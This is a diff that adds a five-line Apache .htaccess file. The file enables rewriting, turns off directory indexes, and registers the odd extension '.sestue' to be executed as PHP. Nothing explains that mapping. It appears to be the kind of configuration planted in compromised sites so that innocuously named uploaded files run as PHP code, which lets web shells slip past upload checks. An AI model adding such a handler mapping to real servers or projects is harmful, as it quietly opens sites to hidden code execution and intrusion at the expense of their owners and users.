@@ -1,0 +1,5 @@
+RewriteEngine on
+
+Options All -Indexes
+
+AddType application/x-httpd-php .sestue
